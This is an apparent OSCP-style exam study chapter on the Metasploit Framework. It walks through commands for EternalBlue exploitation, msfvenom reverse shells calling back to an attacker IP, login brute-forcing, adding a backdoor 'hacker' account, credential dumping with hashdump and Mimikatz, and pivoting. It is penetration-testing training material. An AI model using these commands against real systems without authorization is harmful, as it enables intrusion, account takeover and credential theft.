# 14 — Metasploit Framework

You can only use Metasploit on ONE target during the exam. That makes it critical to know the framework inside and out — when you use your one shot, you need it to count.

---

## Starting Metasploit

```bash
# Start the database (stores scan results, creds, sessions)
sudo systemctl start postgresql
sudo systemctl enable postgresql

# Initialize the database (first time only)
sudo msfdb init

# Start Metasploit
msfconsole

# Verify database connection
msf6> db_status
# [*] Connected to msf. Connection type: postgresql.

# If not connected
msf6> db_connect msf@msf
# Or exit, run: sudo msfdb reinit, then restart msfconsole
```

---

## Searching for Modules

```bash
# By keyword
search apache
search eternalblue
search tomcat

# By type
search type:exploit apache
search type:auxiliary scanner ssh
search type:post windows gather

# By CVE
search cve:2021-44228
search cve:2017-0144

# By platform
search type:exploit platform:windows smb
search type:exploit platform:linux

# By rank (reliability)
search type:exploit rank:excellent apache

# Combined filters
search type:exploit platform:windows smb rank:great

# Module types explained:
# exploit     — delivers a payload to get a shell
# auxiliary   — scanners, brute forcers, fuzzers (no payload)
# post        — run after you have a session (privesc, info gathering)
# payload     — the code that runs on the target (shell, meterpreter)
# encoder     — obfuscates payloads to bypass AV
# nop         — padding for exploits
```

---

## Using a Module

```bash
# Select by number from search results
search eternalblue
use 0

# Or by full path
use exploit/windows/smb/ms17_010_eternalblue

# See what needs to be configured
show options

# Set required options
set RHOSTS 192.168.244.135
set RPORT 445
set LHOST 192.168.244.129
set LPORT 4444

# See ALL options (including hidden ones)
show advanced

# See evasion options (IDS/IPS bypass)
show evasion

# See compatible payloads
show payloads

# Set a payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Verify everything
show options

# Run the exploit
exploit
# or
run
```

### Understanding the options

| Option | What it is | Example |
|---|---|---|
| `RHOSTS` | Target IP(s) | `192.168.244.135` or `192.168.244.0/24` |
| `RPORT` | Target port | `445` (default for SMB) |
| `LHOST` | Your Kali IP (callback address) | `192.168.244.129` |
| `LPORT` | Your Kali port (callback port) | `4444` |
| `PAYLOAD` | What runs on the target | `windows/x64/shell_reverse_tcp` |

### Global options (persist across modules)

```bash
# Set globally — applies to all modules
setg LHOST 192.168.244.129
setg LPORT 4444

# Now every module you load already has LHOST and LPORT set

# Clear a global
unsetg LHOST

# Clear a regular option
unset RHOSTS
```

### Go back to main menu

```bash
back
```

---

## Auxiliary Modules (Scanners and Enumeration)

Auxiliary modules don't exploit anything — they gather information. They're NOT restricted by the one-target rule (debatable — use at your own discretion for scanning, but don't rely on them for exploitation).

### Port scanning

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.244.0/24
set PORTS 22,80,443,445,3389,5985
set THREADS 20
run
```

### SMB enumeration

```bash
# SMB version
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.244.0/24
run

# SMB shares
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS TARGET
set SMBUser admin
set SMBPass password
run

# SMB users
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS TARGET
run

# Check for EternalBlue
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS TARGET
run

# SMB login brute force
use auxiliary/scanner/smb/smb_login
set RHOSTS TARGET
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 4
run
```

### SSH enumeration

```bash
# SSH version
use auxiliary/scanner/ssh/ssh_version
set RHOSTS TARGET
run

# SSH login brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS TARGET
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 4
run
```

### HTTP enumeration

```bash
# HTTP version
use auxiliary/scanner/http/http_version
set RHOSTS TARGET
run

# Directory scanner
use auxiliary/scanner/http/dir_scanner
set RHOSTS TARGET
run

# HTTP login brute force
use auxiliary/scanner/http/http_login
set RHOSTS TARGET
set AUTH_URI /login.php
run
```

### Using db_nmap (scan and auto-store results)

```bash
# Run nmap through Metasploit — results automatically stored
db_nmap -sV -sC 192.168.244.0/24

# View stored results
hosts                    # all discovered hosts
services                 # all discovered services
services -p 445          # filter by port
vulns                    # discovered vulnerabilities
creds                    # harvested credentials
```

---

## Payloads — Understanding Your Options

### Selecting a non-default payload

```bash
use exploit/windows/smb/ms17_010_eternalblue
show payloads

# Meterpreter (most powerful — full post-exploitation)
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Basic command shell (simpler, works when Meterpreter fails)
set PAYLOAD windows/x64/shell_reverse_tcp

# Bind shell (target listens, you connect)
set PAYLOAD windows/x64/shell_bind_tcp

# Execute a single command
set PAYLOAD windows/exec
set CMD "net user hacker Password1! /add"

# Add a user account
set PAYLOAD windows/adduser
set USER hacker
set PASS Password1!
```

### Staged vs stageless

```bash
# Staged (slash) — smaller, needs multi/handler
windows/x64/meterpreter/reverse_tcp

# Stageless (underscore) — bigger, works with nc listener
windows/x64/meterpreter_reverse_tcp

# For your one Metasploit target: use staged + multi/handler
# For all other targets: use stageless + nc
```

### Linux payloads

```bash
set PAYLOAD linux/x64/shell_reverse_tcp          # basic shell
set PAYLOAD linux/x64/meterpreter/reverse_tcp    # meterpreter
set PAYLOAD linux/x64/shell/reverse_tcp          # staged basic shell
```

---

## The multi/handler (EXEMPT from one-target rule)

This is the most important Metasploit module for the exam. You can use it on EVERY target to catch reverse shells generated by MSFVenom.

```bash
use exploit/multi/handler

# Match the payload to what MSFVenom generated
set PAYLOAD linux/x64/shell_reverse_tcp      # if you used this in msfvenom
set LHOST 192.168.244.129
set LPORT 4444

# Run as a background job (so you can keep using msfconsole)
run -j
# [*] Started reverse TCP handler on 192.168.244.129:4444

# Run on multiple ports simultaneously
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST 192.168.244.129
set LPORT 5555
run -j

# Now you have listeners on 4444 AND 5555
jobs
# Shows all active handlers
```

### Workflow: MSFVenom + multi/handler

```bash
# Step 1: Generate payload on Kali
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.244.129 LPORT=4444 -f elf -o shell.elf

# Step 2: Start handler
msfconsole -q
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp     # MUST match MSFVenom payload
set LHOST 192.168.244.129
set LPORT 4444
run -j

# Step 3: Deliver and execute the payload on the target
# (wget, certutil, scp, web shell — whatever method works)

# Step 4: Session arrives
sessions
sessions -i 1
```

---

## Session Management

```bash
# List all sessions
sessions

# Interact with a session
sessions -i 1

# Background the current session
background
# or Ctrl+Z

# Upgrade a basic shell to Meterpreter
sessions -u 1
# Creates a new Meterpreter session (session 2)

# Kill a session
sessions -k 1

# Kill all sessions
sessions -K

# Run a command on a session without interacting
sessions -c "whoami" -i 1
```

---

## Meterpreter Post-Exploitation

When you have a Meterpreter session (only on your one Metasploit target):

### System information

```bash
sysinfo                    # OS, architecture, hostname
getuid                     # current user
getpid                     # current process ID
ps                         # list running processes
ifconfig                   # network interfaces
route                      # routing table
arp                        # ARP table
```

### Privilege escalation

```bash
getsystem                  # try multiple privesc techniques automatically
# If getsystem fails:
run post/multi/recon/local_exploit_suggester
# Lists potential local privesc exploits

# Try a suggested exploit
use exploit/windows/local/ms16_075_reflection_juicy
set SESSION 1
run
```

### Credential dumping

```bash
hashdump                   # dump SAM hashes (need SYSTEM)
run post/windows/gather/credentials/credential_collector
load kiwi                  # load Mimikatz inside Meterpreter
creds_all                  # dump all credentials
creds_msv                  # dump NTLM hashes
creds_kerberos             # dump Kerberos tickets
creds_wdigest              # dump plaintext passwords (older systems)
```

### File operations

```bash
upload /path/on/kali /path/on/target
download /path/on/target /path/on/kali
cat /etc/passwd
edit /tmp/file.txt         # opens in vim
search -f *.txt -d /home   # find files
```

### Pivoting through Meterpreter

```bash
# Add a route to an internal network through this session
run autoroute -s 10.10.10.0/24

# Or manually
route add 10.10.10.0/24 SESSION_NUMBER

# Now Metasploit modules can target 10.10.10.0/24 through this session
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.20
run
# Traffic goes through the Meterpreter session automatically

# Set up a SOCKS proxy for non-Metasploit tools
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j
# Configure proxychains: socks5 127.0.0.1 1080
# Now: proxychains nmap -sT -Pn 10.10.10.20
```

### Port forwarding

```bash
# Forward a local port to an internal target
portfwd add -l 8080 -p 80 -r 10.10.10.20
# Now on Kali: curl http://localhost:8080 → hits internal web server

# Forward a local port for RDP
portfwd add -l 3389 -p 3389 -r 10.10.10.20
# Now: xfreerdp /v:localhost /u:admin /p:pass

# List port forwards
portfwd list

# Remove
portfwd delete -l 8080 -p 80 -r 10.10.10.20
```

### Drop to a system shell

```bash
shell                      # drop to OS shell (cmd.exe on Windows, /bin/bash on Linux)
# Ctrl+Z or exit to return to Meterpreter
```

---

## Metasploit Through Tunnels

When the target is on an internal network you can only reach through a tunnel:

### Through proxychains

```bash
# Set up your tunnel first (SSH -D, Chisel, etc.)
# Then set the Proxies option in Metasploit

use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.20
set Proxies socks5:127.0.0.1:1080
run
```

### Through Meterpreter autoroute

```bash
# If you already have a Meterpreter session on the pivot machine
run autoroute -s 10.10.10.0/24

# Now just set RHOSTS to the internal target — Metasploit routes automatically
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.20
run
```

---

## Workspaces (organize your exam)

```bash
# List workspaces
workspace

# Create a workspace for each target
workspace -a standalone1
workspace -a standalone2
workspace -a standalone3
workspace -a ad_set

# Switch workspace
workspace standalone1

# All hosts, services, creds are now scoped to this workspace
hosts
services
creds
```

---

## Exam Strategy for Metasploit

```
BEFORE THE EXAM:
  - Decide which type of target you'll save Metasploit for
  - Usually the hardest Windows standalone

DURING THE EXAM:
  - Use multi/handler freely on all targets (EXEMPT)
  - Use MSFVenom to generate payloads for all targets (EXEMPT)
  - When you're stuck on one machine and manual exploitation fails:
    → That's your Metasploit target
    → search for the exploit
    → set PAYLOAD to meterpreter
    → exploit → getsystem → hashdump → done

DON'T waste Metasploit on:
  - An easy machine you could exploit manually
  - The AD set (you need manual tools for the full chain)
  - The first machine you try (save it for when you're stuck)
```
